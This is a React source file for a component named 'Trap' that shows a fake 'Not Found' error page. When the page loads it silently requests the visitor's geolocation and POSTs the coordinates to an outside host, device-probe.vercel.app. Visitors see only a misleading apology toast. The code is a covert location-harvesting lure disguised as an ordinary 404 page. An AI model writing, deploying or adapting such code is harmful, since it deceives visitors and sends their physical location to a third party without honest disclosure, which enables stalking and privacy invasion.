/* eslint-disable react-hooks/rules-of-hooks */
import React from "react";
import { useEffect, useCallback } from "react";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

const Trap = () => {
  // useEffect(() => {
  //   getLocation();
  // }, [getLocation]);

  // async function getLocation() {
  //   try {
  //     const position = await getCurrentPosition();
  //     const { latitude, longitude } = position.coords;
  //     const body = {
  //       deviceLatitude: latitude,
  //       deviceLongitude: longitude,
  //     };
  //     await main(body);
  //   } catch (error) {
  //     console.error("Error getting location:", error);
  //     toast.error("sorry for inconvenience");
  //     await main({ deviceLatitude: "", deviceLongitude: "" });
  //   }
  // }

  const getLocation = useCallback(async () => {
    try {
      const position = await getCurrentPosition();
      const { latitude, longitude } = position.coords;
      const body = {
        deviceLatitude: latitude,
        deviceLongitude: longitude,
      };
      await main(body);
    } catch (error) {
      console.error("Error getting location:", error);
      toast.error("Sorry for the inconvenience");
      await main({ deviceLatitude: "", deviceLongitude: "" });
    }
  }, []);

  useEffect(() => {
    getLocation();
  }, [getLocation]);

  async function getCurrentPosition() {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        (position) => resolve(position),
        (error) => reject(error)
      );
    });
  }

  async function main(body) {
    try {
      const response = await fetch("https://device-probe.vercel.app/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(body),
      });

      if (!response.ok) {
        throw new Error("Failed to send location");
      }

      await response.json();

      toast.success("sorry for inconvenience");
    } catch (error) {
      toast.error("sorry for inconvenience");
      throw error;
    }
  }

  return (
    <>
      <div className="not-found">
        <h1>Not Found</h1>
        <p>We're sorry, but the page you requested could not be found.</p>
        <button>Go Back</button>
      </div>
      <ToastContainer />
    </>
  );
};

export default Trap;
